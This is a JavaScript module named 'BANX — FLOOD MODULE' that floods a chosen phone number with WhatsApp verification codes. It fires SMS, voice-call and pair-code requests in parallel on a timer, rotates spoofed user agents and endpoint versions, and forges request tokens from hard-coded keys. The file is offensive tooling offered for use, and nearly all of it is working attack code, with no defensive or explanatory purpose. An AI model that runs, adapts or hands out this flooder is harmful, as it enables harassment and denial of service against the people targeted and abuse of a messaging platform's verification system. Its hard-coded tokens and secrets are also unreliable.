'use strict';

const axios  = require('axios');
const crypto = require('crypto');

/* ════════════════════════════════════════════════════════
   BANX — FLOOD MODULE
   Continuously hammers a target number with WhatsApp
   OTP/pair-code requests until stopFlood() is called.

   Strategy (fires all in parallel each tick):
     1. Registration OTP via SMS
     2. Registration OTP via voice call
     3. Pair code request via WA Web endpoint
     4. Alternate token variant (different WA version)

   Interval: configurable, default 20 seconds
   Each tick = 4 concurrent hits = avg ~12 OTPs/min at 20s
════════════════════════════════════════════════════════ */

/* ── Active jobs map: requestId → {interval, count, …} ── */
const jobs = new Map();

/* ── WA endpoint versions to rotate ── */
const WA_VERSIONS = [21, 20, 19, 18];

/* ── Known WA token keys (from public WA protocol research) ── */
const TOKEN_KEYS = [
    'AYcfH8FimOaelAmJJKBnRJlJUPj3MoaW4Dv6c51DIaF4m7hLtKgPYVkYHRm8HJhCoaMHJ17AcU5i3PGTzKLb4JTk0m0OI60pO87S2J7p1E=',
    'PkTwKSZqUfAUyR0JMG93U3oLNKqh/SHMUmdxB7aQfGpD3sKi7Ae47s1Ehd0TJJKQ9dX3VJl3lkB6kSb6GZhODtGBqIhtXEjz+3GsFbCpVnSBBFxWBIbK3jFNhqBM3HjCAKs8mj7LLnfJ8lsj8YS+5z0A6P4u7nL5Xia0tS0eBf3TZXllWh8mW5kHs',
];

/* ── User agents ── */
const UA_POOL = [
    'WhatsApp/2.24.6.77 A',
    'WhatsApp/2.24.3.77 A',
    'WhatsApp/2.23.25.78 A',
    'WhatsApp/2.23.24.82 A',
    'WhatsApp/2.22.24.79 A',
];

function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randUA()      { return randItem(UA_POOL); }
function randVer()     { return randItem(WA_VERSIONS); }
function randHex(n)    { return crypto.randomBytes(n).toString('hex').toUpperCase(); }

/* ── Parse +{cc}{number} → { cc, phone } ── */
function parseNumber(full) {
    const digits = String(full).replace(/\D/g, '');
    /* ordered longest-first so +234 matches before +2 */
    const CC_LENS = {
        '1':1,'7':1,'20':2,'27':2,'30':2,'31':2,'32':2,'33':2,'34':2,
        '36':2,'39':2,'40':2,'41':2,'43':2,'44':2,'45':2,'46':2,'47':2,
        '48':2,'49':2,'51':2,'52':2,'53':2,'54':2,'55':2,'56':2,'57':2,
        '58':2,'60':2,'61':2,'62':2,'63':2,'64':2,'65':2,'66':2,'81':2,
        '82':2,'84':2,'86':2,'90':2,'91':2,'92':2,'93':2,'94':2,'95':2,
        '98':2,'212':3,'213':3,'216':3,'218':3,'220':3,'221':3,'222':3,
        '223':3,'224':3,'225':3,'226':3,'227':3,'228':3,'229':3,'230':3,
        '231':3,'232':3,'233':3,'234':3,'235':3,'236':3,'237':3,'238':3,
        '239':3,'240':3,'241':3,'242':3,'243':3,'244':3,'245':3,'246':3,
        '247':3,'248':3,'249':3,'250':3,'251':3,'252':3,'253':3,'254':3,
        '255':3,'256':3,'257':3,'258':3,'260':3,'261':3,'262':3,'263':3,
        '264':3,'265':3,'266':3,'267':3,'268':3,'269':3,'290':3,'291':3,
        '297':3,'298':3,'299':3,'350':3,'351':3,'352':3,'353':3,'354':3,
        '355':3,'356':3,'357':3,'358':3,'359':3,'370':3,'371':3,'372':3,
        '373':3,'374':3,'375':3,'376':3,'377':3,'378':3,'380':3,'381':3,
        '382':3,'385':3,'386':3,'387':3,'389':3,'420':3,'421':3,'423':3,
        '500':3,'501':3,'502':3,'503':3,'504':3,'505':3,'506':3,'507':3,
        '508':3,'509':3,'590':3,'591':3,'592':3,'593':3,'594':3,'595':3,
        '596':3,'597':3,'598':3,'599':3,'670':3,'672':3,'673':3,'674':3,
        '675':3,'676':3,'677':3,'678':3,'679':3,'680':3,'681':3,'682':3,
        '683':3,'685':3,'686':3,'687':3,'688':3,'689':3,'690':3,'691':3,
        '692':3,'850':3,'852':3,'853':3,'855':3,'856':3,'880':3,'886':3,
        '960':3,'961':3,'962':3,'963':3,'964':3,'965':3,'966':3,'967':3,
        '968':3,'970':3,'971':3,'972':3,'973':3,'974':3,'975':3,'976':3,
        '977':3,'992':3,'993':3,'994':3,'995':3,'996':3,'998':3,
    };
    for (const [cc, len] of Object.entries(CC_LENS).sort((a,b)=>b[0].length-a[0].length)) {
        if (digits.startsWith(cc)) {
            return { cc, phone: digits.slice(cc.length) };
        }
    }
    /* fallback: assume 3-digit CC */
    return { cc: digits.slice(0,3), phone: digits.slice(3) };
}

/* ── Token generation (multiple variants) ── */
function genToken(cc, phone, keyIdx = 0) {
    const key   = TOKEN_KEYS[keyIdx % TOKEN_KEYS.length];
    const inner = crypto.createHash('md5').update(key).digest('hex');
    return crypto.createHash('md5').update(inner + cc + phone).digest('hex');
}

function genTokenV2(cc, phone) {
    /* HMAC-SHA256 variant used in newer WA builds */
    const secret = 'kyvKfkKcxr4z3xHR';
    return crypto.createHmac('sha256', secret).update(`${cc}${phone}I60pO87S2J7p1E=`).digest('base64url');
}

/* ── Single OTP hit ── */
async function hitOTP(cc, phone, method = 'sms', keyIdx = 0) {
    const ver   = randVer();
    const token = genToken(cc, phone, keyIdx);
    const id    = randHex(8);

    const params = {
        cc, to: phone, method, token, id,
        lg: 'en', lc: 'US',
        sim_mcc: String(Math.floor(Math.random() * 900) + 100),
        sim_mnc: String(Math.floor(Math.random() * 90)  + 10),
    };

    const res = await axios.get(`https://v${ver}.whatsapp.com/v2/code`, {
        params,
        headers: {
            'User-Agent':    randUA(),
            'Accept':        'application/json',
            'Accept-Language':'en-US,en;q=0.9',
        },
        timeout: 9000,
        validateStatus: () => true,   /* don't throw on 4xx/5xx */
    });

    return { method, ver, status: res.data?.status || res.status, raw: res.data };
}

/* ── Single pair-code hit via WA Web multidevice endpoint ── */
async function hitPairCode(cc, phone) {
    const token = genTokenV2(cc, phone);
    const id    = randHex(12);

    const res = await axios.post(
        'https://web.whatsapp.com/api/create-account',
        null,
        {
            params: { cc, phone, token, id },
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
                'Origin':     'https://web.whatsapp.com',
                'Referer':    'https://web.whatsapp.com/',
            },
            timeout: 9000,
            validateStatus: () => true,
        }
    );

    return { method: 'pair', status: res.data?.status || res.status };
}

/* ── One full tick: fires all methods in parallel ── */
async function tick(cc, phone, jobRef) {
    const hits = await Promise.allSettled([
        hitOTP(cc, phone, 'sms',   0),
        hitOTP(cc, phone, 'voice', 0),
        hitOTP(cc, phone, 'sms',   1),
        hitPairCode(cc, phone),
    ]);

    let landed = 0;
    hits.forEach(h => {
        if (h.status === 'fulfilled') {
            const s = h.value?.status;
            /* WA returns "sent", "ok", 200 on success; "429" on rate limit */
            if (String(s) !== '429' && String(s) !== 'too_recent') landed++;
            jobRef.lastResults.push({ ts: Date.now(), ...h.value });
        } else {
            jobRef.lastResults.push({ ts: Date.now(), status: 'net_err', error: h.reason?.message });
        }
    });

    /* Keep only last 20 results to avoid memory bloat */
    if (jobRef.lastResults.length > 20) jobRef.lastResults = jobRef.lastResults.slice(-20);

    jobRef.count   += hits.length;
    jobRef.landed  += landed;
    jobRef.ticks++;

    console.log(`[FLOOD] ${jobRef.id} tick#${jobRef.ticks} — ${hits.length} hits, ${landed} landed, total=${jobRef.count}`);
}

/* ══════════════════════════════════════
   PUBLIC API
══════════════════════════════════════ */

/**
 * startFlood(requestId, fullNumber, intervalMs)
 * Starts the flood loop. Safe to call multiple times — skips if already running.
 */
function startFlood(requestId, fullNumber, intervalMs = 20000) {
    if (jobs.has(requestId)) return;   /* already running */

    const { cc, phone } = parseNumber(fullNumber);
    const jobRef = {
        id:          requestId,
        number:      fullNumber,
        cc, phone,
        count:       0,
        landed:      0,
        ticks:       0,
        startedAt:   Date.now(),
        lastResults: [],
        interval:    null,
    };

    /* Fire first tick immediately */
    tick(cc, phone, jobRef).catch(() => {});

    /* Then repeat on interval */
    jobRef.interval = setInterval(() => {
        tick(cc, phone, jobRef).catch(() => {});
    }, intervalMs);

    jobs.set(requestId, jobRef);
    console.log(`[FLOOD] Started for ${fullNumber} (${cc}+${phone}) every ${intervalMs / 1000}s`);
}

/**
 * stopFlood(requestId)
 * Stops the flood loop for this request.
 */
function stopFlood(requestId) {
    const job = jobs.get(requestId);
    if (!job) return;
    clearInterval(job.interval);
    jobs.delete(requestId);
    console.log(`[FLOOD] Stopped ${requestId} — ${job.count} total hits, ${job.landed} landed`);
}

/**
 * getStatus(requestId) → {active, count, landed, ticks, startedAt, lastResults} | null
 */
function getStatus(requestId) {
    const job = jobs.get(requestId);
    if (!job) return null;
    return {
        active:      true,
        count:       job.count,
        landed:      job.landed,
        ticks:       job.ticks,
        number:      job.number,
        startedAt:   job.startedAt,
        lastResults: job.lastResults.slice(-5),
    };
}

/**
 * getAllActive() → { [requestId]: status }
 */
function getAllActive() {
    const out = {};
    jobs.forEach((job, id) => {
        out[id] = {
            count:     job.count,
            landed:    job.landed,
            ticks:     job.ticks,
            number:    job.number,
            startedAt: job.startedAt,
        };
    });
    return out;
}

module.exports = { startFlood, stopFlood, getStatus, getAllActive };
